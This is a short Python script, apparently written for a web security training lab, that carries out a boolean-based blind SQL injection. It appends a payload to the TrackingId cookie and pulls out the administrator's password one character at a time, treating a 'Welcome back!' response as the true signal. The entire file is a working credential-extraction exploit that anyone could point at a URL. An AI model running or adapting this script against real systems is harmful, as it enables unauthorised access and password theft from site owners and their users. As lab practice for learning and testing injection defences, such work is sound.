import urllib.request
import argparse
import re
import urllib.response
import pprint
from string import ascii_lowercase as letters
from string import digits


parser = argparse.ArgumentParser()
parser.add_argument("url")
args = parser.parse_args()



initial_response = urllib.request.urlopen(args.url)
#print(str(initial_response.headers))
pattern = re.compile("TrackingId=[a-zA-Z0-9]*;")
cookie=pattern.search(str(initial_response.headers))
cookie = cookie.group(0).strip(';')

admin_pass=[]
for i in range(1,21):
    for character in letters+digits :

        payload = f"' AND SUBSTR ((SELECT password FROM users WHERE username='administrator'),{i},1)='{character}"
        req = urllib.request.Request(args.url)
        req.add_header('Cookie',cookie+payload)
        response = urllib.request.urlopen(req)

        if re.search("Welcome back!",str(response.read())):
            admin_pass.append(character)
            print(admin_pass)
            break
print(admin_pass)


